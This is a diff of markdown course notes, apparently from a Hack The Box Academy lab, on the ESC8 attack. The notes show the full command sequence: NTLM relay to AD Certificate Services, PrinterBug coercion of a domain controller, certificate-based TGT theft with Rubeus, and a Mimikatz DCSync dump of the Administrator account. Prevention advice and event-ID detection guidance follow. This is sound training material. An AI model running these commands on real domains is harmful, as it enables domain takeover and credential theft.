@@ -1,17 +1,18 @@
+# Skills Assessment
 
-# Description
+## Description
 
-Following up on the PKI-related attack scenario from the previous section, another attack we can abuse is relaying to `ADCS` to obtain a certificate, a technique known as `ESC8`.
+Following up on the PKI-related attack scenario from the previous section, another attack we can abuse is relaying to `ADCS` to obtain a certificate, a technique known as `ESC8`.
 
-Previously, we used `PrinterBug` and `Coercer` to make (or force) computers to connect to any other computer. In this scenario, we will utilize the `PrinterBug,` and with the received reverse connection, we will relay to ADCS to obtain a certificate for the machine we coerced.
+Previously, we used `PrinterBug` and `Coercer` to make (or force) computers to connect to any other computer. In this scenario, we will utilize the `PrinterBug,` and with the received reverse connection, we will relay to ADCS to obtain a certificate for the machine we coerced.
 
----
+***
 
-# Attack
+## Attack
 
-We begin by configuring `NTLMRelayx` to forward incoming connections to the HTTP endpoint of our Certificate Authority. As part of this configuration, we will specify that we want to obtain a certificate for the Domain Controller (a default template in AD, which Domain Controllers use for client authentication). The `--adcs` switch makes `NTLMRelayx` parse and displays the certificate if one is received:
+We begin by configuring `NTLMRelayx` to forward incoming connections to the HTTP endpoint of our Certificate Authority. As part of this configuration, we will specify that we want to obtain a certificate for the Domain Controller (a default template in AD, which Domain Controllers use for client authentication). The `--adcs` switch makes `NTLMRelayx` parse and displays the certificate if one is received:
 
-  Attack
+&#x20; Attack
 
 ```shell-session
 LeDaav@htb[/htb]$ impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs
@@ -40,9 +41,9 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 ![Starting NTLMRelay](https://academy.hackthebox.com/storage/modules/176/A14/ntlmrelaystart.png)
 
-Now we need to get the Domain Controller to connect to us. We’ll use the `Print Spooler` bug and force a reverse connection to us (as we previously did in a previous lab). In this case, we are forcing DC2 to connect to the Kali machine while we have `NTLMRelayx` listening in another terminal:
+Now we need to get the Domain Controller to connect to us. We’ll use the `Print Spooler` bug and force a reverse connection to us (as we previously did in a previous lab). In this case, we are forcing DC2 to connect to the Kali machine while we have `NTLMRelayx` listening in another terminal:
 
-  Attack
+&#x20; Attack
 
 ```shell-session
 LeDaav@htb[/htb]$ python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
@@ -57,9 +58,9 @@ LeDaav@htb[/htb]$ python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle
 
 ![Printer Bug](https://academy.hackthebox.com/storage/modules/176/A14/dementor.png)
 
-If we switch back to terminal of `NTLMRelayx`, we will see that an incoming request from `DC2$` was relayed and a certificate was successfully obtained:
+If we switch back to terminal of `NTLMRelayx`, we will see that an incoming request from `DC2$` was relayed and a certificate was successfully obtained:
 
-  Attack
+&#x20; Attack
 
 ```shell-session
 [*] SMBD-Thread-5 (process_request_thread): Received connection from 172.16.18.4, attacking target http://172.16.18.15
@@ -82,9 +83,9 @@ awlkK4goAPpDmzA9MDEwDQYJYIZIAWUDBAIBBQAEIFRQPz8lJcfLnaSLiZE6XHwdBfhN0CvXA6VfHQyH
 
 ![NTLMRelay certificate obtained](https://academy.hackthebox.com/storage/modules/176/A14/DC2Cert.png)
 
-We will copy the obtained base64-encoded certificate, switch to the Windows machine, and use `Rubeus` to the certificate to authenticate with (this time, the certificate is in the proper format) and obtain a TGT:
+We will copy the obtained base64-encoded certificate, switch to the Windows machine, and use `Rubeus` to the certificate to authenticate with (this time, the certificate is in the proper format) and obtain a TGT:
 
-  Attack
+&#x20; Attack
 
 ```powershell-session
 .\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqGSI<SNIP>
@@ -150,9 +151,9 @@ We will copy the obtained base64-encoded certificate, switch to the Windows mach
 
 ![Rubeus TGT for DC2](https://academy.hackthebox.com/storage/modules/176/A14/RubeusCert2.png)
 
-We have now obtained a TGT for the Domain Controller DC2. Therefore we become DC2. Being a Domain Controller, we can now trigger `DCSync` with `Mimikatz`:
+We have now obtained a TGT for the Domain Controller DC2. Therefore we become DC2. Being a Domain Controller, we can now trigger `DCSync` with `Mimikatz`:
 
-  Attack
+&#x20; Attack
 
 ```powershell-session
 .\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
@@ -213,22 +214,22 @@ Bye!
 
 ![DCSync](https://academy.hackthebox.com/storage/modules/176/A14/mimikatz.png)
 
----
+***
 
-# Prevention
+## Prevention
 
 The above attack was possible because:
 
-- We managed to coerce DC2 successfully
-- ADCS web enrollment does not enforce HTTPS (otherwise, relaying would fail, and we won't request a certificate)
+* We managed to coerce DC2 successfully
+* ADCS web enrollment does not enforce HTTPS (otherwise, relaying would fail, and we won't request a certificate)
 
-Because there are many different PKI-related escalation techniques, it is highly advised to regularly scan the environment with `Certify` or other similar tools to find potential issues.
+Because there are many different PKI-related escalation techniques, it is highly advised to regularly scan the environment with `Certify` or other similar tools to find potential issues.
 
----
+***
 
-# Detection
+## Detection
 
-This attack provides multiple techniques for detection. If we start from the part where a certificate is requested by `NTLMRelayx`, we will see that the CA has flagged both the request and the issuer of the certificate in events ID `4886` and `4887`, respectively:
+This attack provides multiple techniques for detection. If we start from the part where a certificate is requested by `NTLMRelayx`, we will see that the CA has flagged both the request and the issuer of the certificate in events ID `4886` and `4887`, respectively:
 
 ![DC2 certificate request](https://academy.hackthebox.com/storage/modules/176/A14/d1.png)
 
@@ -236,12 +237,12 @@ This attack provides multiple techniques for detection. If we start from the par
 
 What stands out is that the template name is mentioned as part of the request; however, it isn't if requested by the Domain Controller itself (not relaying). There may be some exceptions to this in an environment; thus, it is best to check if it could be used as an indicator of flagging, coercing/relaying attacks to ADCS.
 
-Subsequently, in the attack, we utilized the obtained certificate to get a Kerberos TGT, which resulted in the event ID `4768`:
+Subsequently, in the attack, we utilized the obtained certificate to get a Kerberos TGT, which resulted in the event ID `4768`:
 
 ![DC2 logon with certificate](https://academy.hackthebox.com/storage/modules/176/A14/d4.png)
 
-It stands out that `XX` is attempting to log in with a certificate, and the IP address is not the DC's.
+It stands out that `XX` is attempting to log in with a certificate, and the IP address is not the DC's.
 
-Finally, when we used `Mimikatz` to perform DCSync, we will see the event ID `4624` that indicates `XX` authenticated successfully from another IP address and not it is own:
+Finally, when we used `Mimikatz` to perform DCSync, we will see the event ID `4624` that indicates `XX` authenticated successfully from another IP address and not it is own:
 
 ![DC2 DCSync logon event](https://academy.hackthebox.com/storage/modules/176/A14/d3.png)
